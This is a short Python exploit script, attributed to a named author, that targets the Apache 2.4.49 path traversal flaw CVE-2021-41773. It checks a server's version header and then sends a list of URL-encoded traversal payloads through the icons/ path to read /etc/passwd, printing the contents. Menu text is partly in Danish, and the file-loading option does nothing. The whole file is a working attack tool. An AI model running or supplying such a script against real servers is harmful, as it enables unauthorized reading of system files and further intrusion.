#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# =============================================================================
# Created By  : Christian Norrig
# Created Date: January 2022
# Description: Exploits Apache CVE-2021-41773 
# ======


import subprocess
import time
import requests
import sys

def initial_start():


	print("Velkommen til norrigs apache exploiter")
	print("Bemærk, kræver at victims apache er version 2.4.49")
	print("-----")
	print("(1) Load urls from text file")
	print("(2) Input specific URL")
	print("(3) Quit")

	while True:
		try:
			choice = int(input())
			break
		except:
			print("Not a valid choice")

	return choice


def step_1(url):
	print("Loading: " + url)
	time.sleep(1)
	print("Getting server information..")
	r = requests.get(url)
	time.sleep(1)
	server_type = r.headers["Server"]
	print(" ")
	if "2.4.49" in str(server_type):
		print("✅  Server is running a vulnerable version")
		step_2(url)
	else:
		print("❌  Server is NOT running a vulnerable version")	
	sys.exit(0)


def step_2(url):

	access_path = 'icons/'
	#payloads = ['.%2e/%2e%2e/%2e%2e/%2e%2e', '.%2e/%2e%2e', '.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e', '.%2e%2e', '.%2E/%2E%2E/%2E%2E/%2E%2E','.%2e/%2e%2e/%2e%2e/%2e%2e','.%2E/.%2E/.%2E/.%2E/%2E/%2E','.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e']
	payloads = ['.%2e/.%2e/.%2e', '%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65', '.%2e/.%2e/.%2e/.%2e', '.%2e/%2e%2e/%2e%2e/%2e%2e']
	initial_file = '/etc/passwd'
	i = 0 
	for payload in payloads:
		try:
			print("")
			exploit = str(url)+str(access_path)+str(payload)+str(initial_file)
			print(exploit)
			print("Trying payload "+str(i+1)+" of "+str(len(payloads)))
			response = requests.get(exploit)
			if "400 Bad Request" in str(response.text):
				print("400, Payload failed, trying new method..")
				i = i+1
				continue
			if "404 Not Found" in str(response.text):
				print("404, Payload failed, trying new method..")
				i = i+1
				continue				
			else:
				print("Succesfully deployed payload")
				print(print(response.text))	
				i = i+1
		except Exception as e:
			print("Error: "+str(e))	
		



while True:
	choice = initial_start()

	if choice == 1:
		print("url from files")

	if choice == 2:
		print("Input a valid URL")
		try:
			url = str(input())
			step_1(url)
		except Exception as E:
			print("Not a valid URL")
			print(E)
	if choice == 3:
		break





